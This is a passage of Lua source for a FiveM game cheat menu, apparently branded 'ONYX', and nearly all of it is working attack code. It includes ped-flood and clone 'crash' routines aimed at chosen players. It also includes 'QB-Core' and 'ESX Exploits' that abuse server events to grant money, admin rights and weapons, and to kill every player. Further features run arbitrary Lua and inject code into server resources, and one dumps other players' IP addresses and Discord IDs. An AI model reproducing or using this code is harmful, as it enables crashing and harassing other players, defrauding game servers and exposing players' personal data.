                                        for _, m in ipairs(models) do
                                            local h = GetHashKey(m)
                                            RequestModel(h)
                                            loaded[#loaded+1] = h
                                        end
                                        Citizen.Wait(500)
                                        local spawned = {}
                                        for wave = 1, 15 do
                                            tp = GetPlayerPed(targetPid)
                                            if not DoesEntityExist(tp) then break end
                                            local c = GetEntityCoords(tp)
                                            for i = 1, 8 do
                                                local h = loaded[math.random(1, #loaded)]
                                                if HasModelLoaded(h) then
                                                    local angle = math.random() * 6.2831
                                                    local dist = math.random() * 3.0 + 1.0
                                                    local ped = CreatePed(26, h, c.x + dist*math.cos(angle), c.y + dist*math.sin(angle), c.z, math.random(0,359)*1.0, true, false)
                                                    if DoesEntityExist(ped) then
                                                        SetEntityAlpha(ped, 0, false)
                                                        SetEntityVisible(ped, false, false)
                                                        FreezeEntityPosition(ped, true)
                                                        SetEntityCollision(ped, false, false)
                                                        SetEntityInvincible(ped, true)
                                                        SetPedCanRagdoll(ped, false)
                                                        SetBlockingOfNonTemporaryEvents(ped, true)
                                                        for _, f in ipairs({17,128,149,223,229,281,287,292,297,301,430,435}) do SetPedConfigFlag(ped, f, true) end
                                                        DisablePedPainAudio(ped, true)
                                                        TaskWanderInArea(ped, c.x, c.y, c.z, 5.0, 5.0, 5.0)
                                                        SetPedAsNoLongerNeeded(ped)
                                                        spawned[#spawned+1] = ped
                                                    end
                                                end
                                            end
                                            Citizen.Wait(150)
                                        end
                                        for _, h in ipairs(loaded) do SetModelAsNoLongerNeeded(h) end
                                        Menu.Toast("Ped flood sent! (" .. #spawned .. " peds)", "red")
                                        Citizen.Wait(4000)
                                        for _, e in ipairs(spawned) do
                                            if DoesEntityExist(e) then DeleteEntity(e) end
                                        end
                                    end)
                                end)
                            end},

                            {name = "Ped Flood (Nearest)", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local myPed = PlayerPedId()
                                    local myC = GetEntityCoords(myPed)
                                    local bestDist, bestPid = 999.0, nil
                                    for _, pid in ipairs(GetActivePlayers()) do
                                        if pid ~= PlayerId() then
                                            local tp = GetPlayerPed(pid)
                                            if DoesEntityExist(tp) then
                                                local d = #(myC - GetEntityCoords(tp))
                                                if d < bestDist then bestDist = d; bestPid = pid end
                                            end
                                        end
                                    end
                                    if not bestPid then Menu.Toast("No one nearby", "red") return end
                                    local models = {"a_m_m_bevhills_01", "a_f_m_bevhills_01", "s_m_y_cop_01", "a_m_y_skater_01", "a_m_m_farmer_01", "a_f_y_tourist_01", "s_m_m_paramedic_01", "a_m_m_afriamer_01"}
                                    local loaded = {}
                                    for _, m in ipairs(models) do
                                        local h = GetHashKey(m)
                                        RequestModel(h)
                                        loaded[#loaded+1] = h
                                    end
                                    Citizen.Wait(500)
                                    local spawned = {}
                                    for wave = 1, 15 do
                                        local tp = GetPlayerPed(bestPid)
                                        if not DoesEntityExist(tp) then break end
                                        local c = GetEntityCoords(tp)
                                        for i = 1, 8 do
                                            local h = loaded[math.random(1, #loaded)]
                                            if HasModelLoaded(h) then
                                                local angle = math.random() * 6.2831
                                                local dist = math.random() * 3.0 + 1.0
                                                local ped = CreatePed(26, h, c.x + dist*math.cos(angle), c.y + dist*math.sin(angle), c.z, math.random(0,359)*1.0, true, false)
                                                if DoesEntityExist(ped) then
                                                    SetEntityAlpha(ped, 0, false)
                                                    SetEntityVisible(ped, false, false)
                                                    FreezeEntityPosition(ped, true)
                                                    SetEntityCollision(ped, false, false)
                                                    SetEntityInvincible(ped, true)
                                                    SetBlockingOfNonTemporaryEvents(ped, true)
                                                    for _, f in ipairs({17,128,149,223,229,281,287,292,297,301,430,435}) do SetPedConfigFlag(ped, f, true) end
                                                    DisablePedPainAudio(ped, true)
                                                    TaskWanderInArea(ped, c.x, c.y, c.z, 5.0, 5.0, 5.0)
                                                    SetPedAsNoLongerNeeded(ped)
                                                    spawned[#spawned+1] = ped
                                                end
                                            end
                                        end
                                        Citizen.Wait(150)
                                    end
                                    for _, h in ipairs(loaded) do SetModelAsNoLongerNeeded(h) end
                                    Menu.Toast("Ped flood sent! (" .. #spawned .. " peds)", "red")
                                    Citizen.Wait(4000)
                                    for _, e in ipairs(spawned) do
                                        if DoesEntityExist(e) then DeleteEntity(e) end
                                    end
                                end)
                            end},

                            {name = "Clone Army Crash (ID)", type = "action", onClick = function()
                                Menu.OpenInput("Clone Army", "Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local targetPid = GetPlayerFromServerId(id)
                                    local tp = GetPlayerPed(targetPid)
                                    if not DoesEntityExist(tp) then Menu.Toast("Not found", "red") return end
                                    Citizen.CreateThread(function()
                                        local spawned = {}
                                        for wave = 1, 20 do
                                            tp = GetPlayerPed(targetPid)
                                            if not DoesEntityExist(tp) then break end
                                            local c = GetEntityCoords(tp)
                                            for i = 1, 6 do
                                                local clone = ClonePed(tp, true, false, true)
                                                if DoesEntityExist(clone) then
                                                    local angle = math.random() * 6.2831
                                                    local dist = math.random() * 4.0 + 1.0
                                                    SetEntityCoords(clone, c.x + dist*math.cos(angle), c.y + dist*math.sin(angle), c.z, false, false, false, true)
                                                    SetEntityAlpha(clone, 0, false)
                                                    SetEntityVisible(clone, false, false)
                                                    FreezeEntityPosition(clone, true)
                                                    SetEntityCollision(clone, false, false)
                                                    SetEntityInvincible(clone, true)
                                                    SetBlockingOfNonTemporaryEvents(clone, true)
                                                    for _, f in ipairs({17,128,149,223,229,281,287,292,297,301,430,435}) do SetPedConfigFlag(clone, f, true) end
                                                    DisablePedPainAudio(clone, true)
                                                    TaskWanderInArea(clone, c.x, c.y, c.z, 6.0, 6.0, 6.0)
                                                    SetPedAsNoLongerNeeded(clone)
                                                    spawned[#spawned+1] = clone
                                                end
                                            end
                                            Citizen.Wait(100)
                                        end
                                        Menu.Toast("Clone army deployed! (" .. #spawned .. " clones)", "red")
                                        Citizen.Wait(4000)
                                        for _, e in ipairs(spawned) do
                                            if DoesEntityExist(e) then DeleteEntity(e) end
                                        end
                                    end)
                                end)
                            end},

                            {name = "Ped Attach Crash (ID)", type = "action", onClick = function()
                                Menu.OpenInput("Ped Attach", "Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local targetPid = GetPlayerFromServerId(id)
                                    local tp = GetPlayerPed(targetPid)
                                    if not DoesEntityExist(tp) then Menu.Toast("Not found", "red") return end
                                    Citizen.CreateThread(function()
                                        local models = {"a_m_m_bevhills_01", "a_f_m_bevhills_01", "s_m_y_cop_01", "a_m_y_skater_01", "s_m_m_paramedic_01"}
                                        local loaded = {}
                                        for _, m in ipairs(models) do
                                            local h = GetHashKey(m)
                                            RequestModel(h)
                                            loaded[#loaded+1] = h
                                        end
                                        Citizen.Wait(500)
                                        local spawned = {}
                                        for wave = 1, 12 do
                                            tp = GetPlayerPed(targetPid)
                                            if not DoesEntityExist(tp) then break end
                                            local c = GetEntityCoords(tp)
                                            for i = 1, 8 do
                                                local h = loaded[math.random(1, #loaded)]
                                                if HasModelLoaded(h) then
                                                    local ped = CreatePed(26, h, c.x, c.y, c.z, 0.0, true, false)
                                                    if DoesEntityExist(ped) then
                                                        SetEntityAlpha(ped, 0, false)
                                                        SetEntityVisible(ped, false, false)
                                                        SetEntityCollision(ped, false, false)
                                                        SetEntityInvincible(ped, true)
                                                        SetBlockingOfNonTemporaryEvents(ped, true)
                                                        DisablePedPainAudio(ped, true)
                                                        AttachEntityToEntity(ped, tp, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                        SetPedAsNoLongerNeeded(ped)
                                                        spawned[#spawned+1] = ped
                                                    end
                                                end
                                            end
                                            Citizen.Wait(100)
                                        end
                                        for _, h in ipairs(loaded) do SetModelAsNoLongerNeeded(h) end
                                        Menu.Toast("Ped attach sent! (" .. #spawned .. " peds)", "red")
                                        Citizen.Wait(5000)
                                        for _, e in ipairs(spawned) do
                                            if DoesEntityExist(e) then
                                                DetachEntity(e, true, true)
                                                DeleteEntity(e)
                                            end
                                        end
                                    end)
                                end)
                            end},

                            {name = "Ped Crash Loop (Toggle)", type = "toggle", value = false, onClick = function(state)
                                Menu.PedCrashLoopActive = state
                                Menu.RegisterFeature("Ped Crash Loop", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        local models = {"a_m_m_bevhills_01", "s_m_y_cop_01", "a_m_y_skater_01", "a_f_y_tourist_01", "s_m_m_paramedic_01"}
                                        local loaded = {}
                                        for _, m in ipairs(models) do
                                            local h = GetHashKey(m)
                                            RequestModel(h)
                                            loaded[#loaded+1] = h
                                        end
                                        Citizen.Wait(500)
                                        while Menu.PedCrashLoopActive do
                                            local myPed = PlayerPedId()
                                            local myC = GetEntityCoords(myPed)
                                            for _, pid in ipairs(GetActivePlayers()) do
                                                if not Menu.PedCrashLoopActive then break end
                                                local tp = GetPlayerPed(pid)
                                                if tp ~= myPed and DoesEntityExist(tp) then
                                                    local d = #(myC - GetEntityCoords(tp))
                                                    if d < 120.0 then
                                                        local c = GetEntityCoords(tp)
                                                        for i = 1, 5 do
                                                            local h = loaded[math.random(1, #loaded)]
                                                            if HasModelLoaded(h) then
                                                                local angle = math.random() * 6.2831
                                                                local dist = math.random() * 3.0 + 1.0
                                                                local ped = CreatePed(26, h, c.x + dist*math.cos(angle), c.y + dist*math.sin(angle), c.z, math.random(0,359)*1.0, true, false)
                                                                if DoesEntityExist(ped) then
                                                                    SetEntityAlpha(ped, 0, false)
                                                                    SetEntityVisible(ped, false, false)
                                                                    FreezeEntityPosition(ped, true)
                                                                    SetEntityCollision(ped, false, false)
                                                                    SetEntityInvincible(ped, true)
                                                                    SetBlockingOfNonTemporaryEvents(ped, true)
                                                                    DisablePedPainAudio(ped, true)
                                                                    TaskWanderInArea(ped, c.x, c.y, c.z, 5.0, 5.0, 5.0)
                                                                    SetPedAsNoLongerNeeded(ped)
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                            Citizen.Wait(800)
                                        end
                                        for _, h in ipairs(loaded) do SetModelAsNoLongerNeeded(h) end
                                    end)
                                end
                            end},
                        }
                    },
                    {
                        name = "Actions",
                        items = {
                            {name = "Attach to Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local myC = GetEntityCoords(myPed)
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    AttachEntityToEntity(myPed, bestPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, true, 2, true)
                                    Menu.AttachedToPed = bestPed
                                end
                            end},

                            {name = "Detach", type = "action", onClick = function()
                                DetachEntity(PlayerPedId(), true, true)
                                Menu.AttachedToPed = nil
                            end},

                            {name = "Clone Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local myC = GetEntityCoords(myPed)
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local clone = ClonePed(bestPed, false, false, false)
                                    local c = GetEntityCoords(myPed)
                                    SetEntityCoords(clone, c.x + 1.0, c.y, c.z, false, false, false, true)
                                end
                            end},

                            {name = "Bring Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local myC = GetEntityCoords(myPed)
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    NetworkRequestControlOfEntity(bestPed)
                                    Citizen.Wait(100)
                                    SetEntityCoords(bestPed, myC.x + 2.0, myC.y, myC.z, false, false, false, true)
                                end
                            end},

                            {isSeparator = true, separatorText = "AFK"},

                            {name = "Launch Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local myC = GetEntityCoords(myPed)
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    NetworkRequestControlOfEntity(bestPed)
                                    Citizen.Wait(100)
                                    SetPedToRagdoll(bestPed, 10000, 10000, 0, false, false, false)
                                    Citizen.CreateThread(function()
                                        for i = 1, 10 do
                                            NetworkRequestControlOfEntity(bestPed)
                                            SetEntityVelocity(bestPed, 0.0, 0.0, 9999.0)
                                            local c = GetEntityCoords(bestPed)
                                            AddOwnedExplosion(PlayerPedId(), c.x, c.y, c.z - 1.0, 5, 500.0, true, false, 1.0)
                                            Citizen.Wait(200)
                                        end
                                    end)
                                end
                            end},

                            {name = "Ragdoll Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local myC = GetEntityCoords(myPed)
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    NetworkRequestControlOfEntity(bestPed)
                                    Citizen.Wait(100)
                                end
                            end},
                        }
                    },
                    {
                        name = "Server",
                        items = {
                                                        {isSeparator = true, separatorText = "QB-Core Exploits"},

                            {name = "QB Add Money (Bank)", type = "action", onClick = function()
                                Menu.OpenInput("QB Money", "Enter amount:", function(input)
                                    local amount = tonumber(input) or 50000
                                    Menu.SafeExec(string.format([[TriggerServerEvent('qb-payments:server:payAccount', 'bank', %d)]], amount))
                                    Menu.Toast("QB bank money: $" .. amount, "green")
                                end)
                            end},

                            {name = "QB Add Cash", type = "action", onClick = function()
                                Menu.OpenInput("QB Cash", "Enter amount:", function(input)
                                    local amount = tonumber(input) or 50000
                                    Menu.SafeExec(string.format([[TriggerServerEvent('qb-payments:server:payAccount', 'cash', %d)]], amount))
                                    Menu.Toast("QB cash: $" .. amount, "green")
                                end)
                            end},

                            {name = "QB Crypto Add", type = "action", onClick = function()
                                Menu.OpenInput("Crypto", "Enter amount:", function(input)
                                    local amount = tonumber(input) or 1000
                                    Menu.SafeExec(string.format([[TriggerServerEvent('qb-crypto:server:buy', 'qbit', %d)]], amount))
                                    Menu.Toast("Crypto: " .. amount, "green")
                                end)
                            end},

                            {name = "QB Set Job", type = "action", onClick = function()
                                Menu.OpenInput("Job Name", "Enter job (police/ambulance):", function(jobName)
                                    if not jobName or jobName == "" then return end
                                    Menu.OpenInput("Grade", "Enter grade (0-5):", function(grade)
                                        local g = tonumber(grade) or 0
                                        Menu.SafeExec(string.format([[TriggerServerEvent('QBCore:Server:SetJob', '%s', %d)]], jobName, g))
                                        Menu.Toast("Job: " .. jobName .. " grade " .. g, "green")
                                    end)
                                end)
                            end},

                            {name = "QB Set Gang", type = "action", onClick = function()
                                Menu.OpenInput("Gang Name", "Enter gang:", function(gangName)
                                    if not gangName or gangName == "" then return end
                                    Menu.OpenInput("Grade", "Enter grade:", function(grade)
                                        local g = tonumber(grade) or 0
                                        Menu.SafeExec(string.format([[TriggerServerEvent('QBCore:Server:SetGang', '%s', %d)]], gangName, g))
                                        Menu.Toast("Gang: " .. gangName, "green")
                                    end)
                                end)
                            end},

                            {name = "QB Give Admin", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:SetPermission', 'god')]])
                                Menu.Toast("Admin requested!", "green")
                            end},

                            {name = "QB Revive Self", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('hospital:server:Revive')]])
                                Menu.SafeExec([[TriggerEvent('hospital:client:Revive')]])
                                Menu.Toast("Revive sent!", "green")
                            end},

                            {name = "QB Give Item", type = "action", onClick = function()
                                Menu.OpenInput("Item Name", "Enter item:", function(itemName)
                                    if not itemName or itemName == "" then return end
                                    Menu.OpenInput("Amount", "Enter amount:", function(amountStr)
                                        local amount = tonumber(amountStr) or 1
                                        Menu.SafeExec(string.format([[TriggerServerEvent('QBCore:Server:AddItem', '%s', %d)]], itemName, amount))
                                        Menu.Toast(itemName .. " x" .. amount, "green")
                                    end)
                                end)
                            end},

                            {name = "QB Add Vehicle Garage", type = "action", onClick = function()
                                Menu.OpenInput("Vehicle", "Enter model (adder):", function(model)
                                    if not model or model == "" then return end
                                    Menu.SafeExec(string.format([[
                                        TriggerServerEvent('qb-garage:server:SaveVehicle', {model = '%s', plate = 'ONYX' .. math.random(100,999)})
                                    ]], model))
                                    Menu.Toast(model .. " added to garage!", "green")
                                end)
                            end},

                            {isSeparator = true, separatorText = "ESX Exploits"},

                            {name = "ESX Add Money", type = "action", onClick = function()
                                Menu.OpenInput("ESX Money", "Enter amount:", function(input)
                                    local amount = tonumber(input) or 50000
                                    Menu.SafeExec(string.format([[TriggerServerEvent('esx:addMoney', %d)]], amount))
                                    Menu.Toast("ESX money: $" .. amount, "green")
                                end)
                            end},

                            {name = "ESX Add Bank", type = "action", onClick = function()
                                Menu.OpenInput("ESX Bank", "Enter amount:", function(input)
                                    local amount = tonumber(input) or 50000
                                    Menu.SafeExec(string.format([[TriggerServerEvent('esx:addAccountMoney', 'bank', %d)]], amount))
                                    Menu.Toast("ESX bank: $" .. amount, "green")
                                end)
                            end},

                            {name = "ESX Add Black Money", type = "action", onClick = function()
                                Menu.OpenInput("Black Money", "Enter amount:", function(input)
                                    local amount = tonumber(input) or 50000
                                    Menu.SafeExec(string.format([[TriggerServerEvent('esx:addAccountMoney', 'black_money', %d)]], amount))
                                    Menu.Toast("Black money: $" .. amount, "green")
                                end)
                            end},

                            {name = "ESX Set Job", type = "action", onClick = function()
                                Menu.OpenInput("Job", "Enter job name:", function(jobName)
                                    if not jobName or jobName == "" then return end
                                    Menu.OpenInput("Grade", "Enter grade:", function(grade)
                                        local g = tonumber(grade) or 0
                                        Menu.SafeExec(string.format([[TriggerServerEvent('esx:setJob', '%s', %d)]], jobName, g))
                                        Menu.Toast("ESX job: " .. jobName, "green")
                                    end)
                                end)
                            end},

                            {name = "ESX Give Weapon", type = "action", onClick = function()
                                Menu.OpenInput("Weapon", "Enter weapon (WEAPON_RPG):", function(wep)
                                    if not wep or wep == "" then return end
                                    Menu.SafeExec(string.format([[TriggerServerEvent('esx:giveWeapon', '%s', 9999)]], wep))
                                    Menu.Toast(wep .. " given!", "green")
                                end)
                            end},

                            {name = "ESX Give Item", type = "action", onClick = function()
                                Menu.OpenInput("Item", "Enter item:", function(itemName)
                                    if not itemName or itemName == "" then return end
                                    Menu.OpenInput("Amount", "Enter amount:", function(amountStr)
                                        local amount = tonumber(amountStr) or 1
                                        Menu.SafeExec(string.format([[TriggerServerEvent('esx:giveInventoryItem', '%s', %d)]], itemName, amount))
                                        Menu.Toast(itemName .. " x" .. amount, "green")
                                    end)
                                end)
                            end},

                            {isSeparator = true, separatorText = "Universal Exploits"},

                            {name = "Revive All Players", type = "action", onClick = function()
                                Menu.SafeExec([[
                                    TriggerServerEvent('hospital:server:RevivePlayer', -1)
                                    TriggerServerEvent('esx_ambulancejob:revive', -1)
                                ]])
                                Menu.Toast("Revive all sent!", "green")
                            end},

                            {name = "Heal All Players", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('hospital:server:HealPlayer', -1)]])
                                Menu.Toast("Heal all sent!", "green")
                            end},

                            {name = "Kill All (Event)", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('esx:killPlayer', -1)]])
                                Menu.Toast("Kill all sent!", "red")
                            end},

                            {name = "Chat Spam (20x)", type = "action", onClick = function()
                                Menu.OpenInput("Message", "Enter spam message:", function(msg)
                                    if not msg or msg == "" then return end
                                    Citizen.CreateThread(function()
                                        for i = 1, 20 do
                                            Menu.SafeExec(string.format([[TriggerServerEvent('chatMessage', 'ONYX', {255,0,0}, '%s')]], msg:gsub("'", "\\'")))
                                            Citizen.Wait(200)
                                        end
                                        Menu.Toast("Spam complete!", "yellow")
                                    end)
                                end)
                            end},

                            {name = "Custom Server Event", type = "action", onClick = function()
                                Menu.OpenInput("Event Name", "Enter server event:", function(eventName)
                                    if not eventName or eventName == "" then return end
                                    Menu.OpenInput("Arguments", "Enter args (comma sep):", function(args)
                                        local code = string.format([[TriggerServerEvent('%s']], eventName)
                                        if args and args ~= "" then
                                            for arg in args:gmatch("[^,]+") do
                                                arg = arg:match("^%s*(.-)%s*$")
                                                local num = tonumber(arg)
                                                if num then code = code .. ", " .. num
                                                else code = code .. ", '" .. arg .. "'" end
                                            end
                                        end
                                        code = code .. ")"
                                        Menu.SafeExec(code)
                                        Menu.Toast("Event: " .. eventName, "green")
                                    end)
                                end)
                            end},

                            {name = "Custom Client Event", type = "action", onClick = function()
                                Menu.OpenInput("Event Name", "Enter client event:", function(eventName)
                                    if not eventName or eventName == "" then return end
                                    Menu.OpenInput("Arguments", "Enter args (comma sep):", function(args)
                                        local code = string.format([[TriggerEvent('%s']], eventName)
                                        if args and args ~= "" then
                                            for arg in args:gmatch("[^,]+") do
                                                arg = arg:match("^%s*(.-)%s*$")
                                                local num = tonumber(arg)
                                                if num then code = code .. ", " .. num
                                                else code = code .. ", '" .. arg .. "'" end
                                            end
                                        end
                                        code = code .. ")"
                                        Menu.SafeExec(code)
                                        Menu.Toast("Event: " .. eventName, "blue")
                                    end)
                                end)
                            end},

                            {name = "Execute Lua Code", type = "action", onClick = function()
                                Menu.OpenInput("Lua Code", "Enter Lua code:", function(code)
                                    if not code or code == "" then return end
                                    Menu.SafeExec(code)
                                    Menu.Toast("Executed!", "green")
                                end)
                            end},

                            {name = "Inject to Resource", type = "action", onClick = function()
                                Menu.OpenInput("Resource", "Enter resource name:", function(resName)
                                    if not resName or resName == "" then return end
                                    Menu.OpenInput("Code", "Enter code:", function(code)
                                        if not code or code == "" then return end
                                        if Susano and Susano.InjectResource then
                                            pcall(function() Susano.InjectResource(resName, code) end)
                                            Menu.Toast("Injected: " .. resName, "green")
                                        else Menu.Toast("Susano unavailable!", "red") end
                                    end)
                                end)
                            end},

                            {isSeparator = true, separatorText = "Resource Specific"},

                            {name = "OxLib Crash Nearby", type = "action", onClick = function()
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("ox_lib", [[
                                        CreateObject = function() end
                                        local props = {}
                                        for i = 1, 600 do props[i] = {model = 'p_spinning_anus_s', coords = vec3(0,0,0), pos = vec3(0,0,0), rot = vec3(0,0,0)} end
                                        LocalPlayer.state:set('lib:progressProps', props, true)
                                        Wait(1000)
                                        LocalPlayer.state:set('lib:progressProps', nil, true)
                                    ]]) end)
                                    Menu.Toast("OxLib crash sent!", "red")
                                else Menu.Toast("Susano unavailable!", "red") end
                            end},

                            {name = "Bring All (dpemotes)", type = "action", onClick = function()
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("dpemotes", [[TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")]]) end)
                                    Menu.Toast("Bring all sent!", "green")
                                else Menu.Toast("Susano unavailable!", "red") end
                            end},

                            {name = "Admin List mc9 (F8)", type = "action", onClick = function()
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("mc9-adminmenu", [[
                                        for id, ply in pairs(CurrentPlayers or {}) do
                                            if ply and ply.name then
                                                print(("Player: %s | ID: %s"):format(ply.name, ply.id))
                                                if ply.identifiers and ply.identifiers.ip then print(("  IP: %s"):format(ply.identifiers.ip:sub(4))) end
                                                if ply.identifiers and ply.identifiers.discord then print(("  Discord: %s"):format(ply.identifiers.discord:sub(9))) end
                                            end
                                        end
                                    ]]) end)
                                    Menu.Toast("Check F8!", "blue")
                                else Menu.Toast("Susano unavailable!", "red") end
                            end},

                            {name = "MC9 Item Spawner", type = "action", onClick = function()
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("mc9-mainmenu", [[
                                        local data = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
                                        for i,v in pairs(data) do mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v) end
                                    ]]) end)
                                    Menu.Toast("MC9 items claimed!", "green")
                                else Menu.Toast("Susano unavailable!", "red") end
                            end},

                            {name = "vMenu Broadcast", type = "action", onClick = function()
                                Menu.OpenInput("Message", "Enter broadcast msg:", function(msg)
                                    if not msg or msg == "" then return end
                                    if Susano and Susano.InjectResource then
                                        pcall(function() Susano.InjectResource("any", string.format([[TriggerServerEvent('vMenu:SendMessageToPlayer', -1, '%s')]], msg:gsub("'", "\\'"))) end)
                                        Menu.Toast("Broadcast sent!", "green")
                                    else Menu.Toast("Susano unavailable!", "red") end
                                end)
                            end},

                            {name = "Give Item (amigo)", type = "action", onClick = function()
                                Menu.OpenInput("Item", "Enter item:", function(itemName)
                                    if not itemName or itemName == "" then return end
                                    Menu.OpenInput("Count", "Enter count:", function(c)
                                        local count = math.min(tonumber(c) or 1, 100000)
                                        if Susano and Susano.InjectResource then
                                            pcall(function() Susano.InjectResource("amigo", string.format([[TriggerServerEvent('player:giveItem', {item='%s', count=%d})]], itemName, count)) end)
                                            Menu.Toast(itemName .. " x" .. count, "green")
                                        else Menu.Toast("Susano unavailable!", "red") end
                                    end)
                                end)
                            end},

                            {name = "OxInventory Give", type = "action", onClick = function()
                                Menu.OpenInput("Item", "Enter item:", function(item)
                                    if not item or item == "" then return end
                                    Menu.OpenInput("Amount", "Enter amount:", function(amt)
                                        local a = tonumber(amt) or 1
                                        if Susano and Susano.InjectResource then
                                            pcall(function() Susano.InjectResource("ox_inventory", string.format([[exports.ox_inventory:AddItem('%s', %d)]], item, a)) end)
                                            Menu.Toast(item .. " x" .. a, "green")
                                        else Menu.Toast("Susano unavailable!", "red") end
                                    end)
                                end)
                            end},

                            {name = "QS Inventory Give", type = "action", onClick = function()
                                Menu.OpenInput("Item", "Enter item:", function(item)
                                    if not item or item == "" then return end
                                    Menu.OpenInput("Amount", "Enter amount:", function(amt)
                                        local a = tonumber(amt) or 1
                                        Menu.SafeExec(string.format([[TriggerServerEvent('qs-inventory:server:addItem', '%s', %d)]], item, a))
                                        Menu.Toast(item .. " x" .. a, "green")
                                    end)
                                end)
                            end},

                            {name = "PS Inventory Give", type = "action", onClick = function()
                                Menu.OpenInput("Item", "Enter item:", function(item)
                                    if not item or item == "" then return end
                                    Menu.OpenInput("Amount", "Enter amount:", function(amt)
                                        local a = tonumber(amt) or 1
                                        Menu.SafeExec(string.format([[TriggerServerEvent('ps-inventory:server:addItem', '%s', %d)]], item, a))
                                        Menu.Toast(item .. " x" .. a, "green")
                                    end)
                                end)
                            end},

                            {isSeparator = true, separatorText = "QBCore Items"},

                            {name = "Give TLE1911", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "weapon_tle1911", 1)]])
                                Menu.Toast("weapon_tle1911 x1", "green")
                            end},

                            {name = "Give Armor", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "armor", 1)]])
                                Menu.Toast("armor x1", "green")
                            end},

                            {name = "Give Lockpick", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "lockpick", 1)]])
                                Menu.Toast("lockpick x1", "green")
                            end},

                            {name = "Give Key1", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "key1", 1)]])
                                Menu.Toast("key1 x1", "green")
                            end},

                            {name = "Give Assault Rifle", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "weapon_assaultrifle", 1)]])
                                Menu.Toast("weapon_assaultrifle x1", "green")
                            end},

                            {name = "Give Ziptie", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "Ziptie", 1)]])
                                Menu.Toast("Ziptie x1", "green")
                            end},

                            {name = "Give Pistol Ammo", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "pistol_ammo", 1)]])
                                Menu.Toast("pistol_ammo x1", "green")
                            end},

                            {name = "Give Radio", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "radio", 1)]])
                                Menu.Toast("radio x1", "green")
                            end},

                            {name = "Give Heavy Pistol", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "weapon_heavypistol", 1)]])
                                Menu.Toast("weapon_heavypistol x1", "green")
                            end},

                            {name = "Give Pistol MK2", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('QBCore:Server:AddItem', "weapon_pistol_mk2", 1)]])
                                Menu.Toast("weapon_pistol_mk2 x1", "green")
                            end},

                            {name = "Give ALL QBCore Items", type = "action", onClick = function()
                                local items = {"weapon_tle1911","armor","lockpick","key1","weapon_assaultrifle","Ziptie","pistol_ammo","radio","weapon_heavypistol","weapon_pistol_mk2"}
                                for _, item in ipairs(items) do
                                    Menu.SafeExec(string.format([[TriggerServerEvent('QBCore:Server:AddItem', "%s", 1)]], item))
                                end
                                Menu.Toast("All QBCore items given!", "green")
                            end},

                                                                                                                {isSeparator = true, separatorText = "Server Tools"},

                            {name = "Dump Events (F8)", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    if GetRegisteredCommands then
                                        for _, cmd in ipairs(GetRegisteredCommands()) do print("CMD: " .. cmd.name) end
                                    end
                                    Menu.Toast("Events dumped to F8!", "blue")
                                end)
                            end},

